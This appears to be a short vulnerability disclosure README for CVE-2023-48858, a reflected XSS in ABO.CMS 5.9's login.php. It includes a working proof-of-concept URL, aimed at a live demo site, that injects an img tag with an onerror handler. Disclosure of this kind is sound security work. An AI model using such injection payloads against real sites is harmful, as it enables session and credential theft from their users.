# CVE-2023-48858
PoC for CVE-2023-48858

A Cross-site scripting (XSS) vulnerability in login page php code in 
Armex ABO.CMS 5.9 allows remote attackers to inject arbitrary web 
script or HTML via the `login.php?` URL part.

Proof of Concept:  
`http://demo.abocms.ru/login.php/eqbzm%22%3E%3Cimg%20src%3d/%20onerror%3dalert%281%29%3Er338y`
![изображение](https://github.com/Shumerez/CVE-2023-48858/assets/52412906/da03ef2b-fc25-4404-bb79-009d10ac3652)

It isn't specifically "demo" version vulnerability, it *was confirmed 
in wild* on real exposed-to-net website  
Link to the demo used here is just to show that this vulnerability persist

Vulnerability Type:  
Cross Site Scripting (XSS)

Vendor of Product:  
Armex Programming Products (INN 7722635725)

(Presumably) affected products:  
ABO.CMS: Start - 5.9  
ABO.CMS: Promo - 5.9  
ABO.CMS: Corporative - 5.9  
ABO.CMS: Shop - 5.9  
ABO.CMS: Business - 5.9  
ABO.CMS: Bank - 5.9  

The problem was found in login.php page, so all versions which use it (login feature) shall be affected. Also I personally don't think anything will change to fix this vulnerability in next versions of ABO.CMS  

Reference:  
https://abocms.ru/about/versions/version59/  
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-48858
